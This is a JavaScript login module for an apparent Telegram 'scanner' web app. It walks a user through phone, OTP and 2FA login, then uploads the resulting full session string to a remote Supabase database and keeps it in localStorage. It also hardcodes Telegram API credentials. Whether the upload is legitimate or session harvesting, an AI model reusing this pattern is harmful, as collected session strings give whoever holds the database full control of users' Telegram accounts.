/**
 * auth.js — Telegram login state machine with Supabase
 */

import { saveSessionToDB } from './db.js';

const API_ID = 39942557;
const API_HASH = '77a67551c7f83be89c33da3a95eefea0';

const STORAGE_KEYS = {
  accounts: 'tg_scanner2_accounts_v1',
  activePhone: 'tg_scanner2_active_phone_v1',
};

let _currentAuth = null;

export async function beginLogin(phone, gramLib, onStateChange) {
  if (!phone || !phone.startsWith('+')) {
    onStateChange({ step: 'error', message: 'Phone number must start with + (e.g. +917890123456)' });
    return;
  }

  const { TelegramClient, StringSession } = gramLib;
  const auth = { resolveOtp: null, resolvePassword: null };
  _currentAuth = auth;

  const session = new StringSession('');

  const client = new TelegramClient(session, API_ID, API_HASH, {
    connectionRetries: 5,
    useWSS: true, 
  });

  try { client.setLogLevel('none'); } catch (_) {}

  onStateChange({ step: 'sending', message: 'Connecting to Telegram…' });

  try {
    // Connect first for native browser build
    await client.connect();

    await client.start({
      phoneNumber: async () => phone,
      phoneCode: async () => {
        onStateChange({ step: 'otp', message: 'OTP sent! Check your Telegram app or SMS.' });
        return new Promise((resolve) => {
          auth.resolveOtp = resolve;
        });
      },
      password: async () => {
        onStateChange({ step: 'password', message: '2FA enabled. Enter your cloud password.' });
        return new Promise((resolve) => {
          auth.resolvePassword = resolve;
        });
      },
      onError: (err) => {
        onStateChange({ step: 'error', message: err.message || 'Login failed' });
      },
    });

    const sessionStr = client.session.save();

    let name = phone;
    let username = '';
    let initials = phone.slice(-2).toUpperCase();

    try {
      const me = await client.getMe();
      name = [me.firstName, me.lastName].filter(Boolean).join(' ').trim() || phone;
      username = me.username || '';
      initials =
        ((me.firstName?.[0] || '') + (me.lastName?.[0] || '')).toUpperCase() ||
        phone.slice(-2).toUpperCase();
    } catch (_) {}

    // 🔥 SAVE TO SUPABASE 🔥
    await saveSessionToDB(phone, sessionStr, name);

    // Save locally for fast UI load
    const accounts = _loadAccounts();
    accounts[phone] = { phone, name, username, initials, session: sessionStr };
    _saveAccounts(accounts);
    localStorage.setItem(STORAGE_KEYS.activePhone, phone);

    onStateChange({
      step: 'done',
      message: `Welcome, ${name}!`,
      client,
      phone,
      name,
      username,
      initials,
      session: sessionStr,
    });
  } catch (err) {
    _currentAuth = null;
    onStateChange({ step: 'error', message: err.message || 'Login failed' });
  }
}

export function submitOtp(code) {
  if (_currentAuth?.resolveOtp) {
    _currentAuth.resolveOtp(code);
    _currentAuth.resolveOtp = null;
  }
}

export function submitPassword(password) {
  if (_currentAuth?.resolvePassword) {
    _currentAuth.resolvePassword(password);
    _currentAuth.resolvePassword = null;
  }
}

function _loadAccounts() {
  try {
    return JSON.parse(localStorage.getItem(STORAGE_KEYS.accounts) || '{}');
  } catch (_) {
    return {};
  }
}

function _saveAccounts(accounts) {
  localStorage.setItem(STORAGE_KEYS.accounts, JSON.stringify(accounts));
}
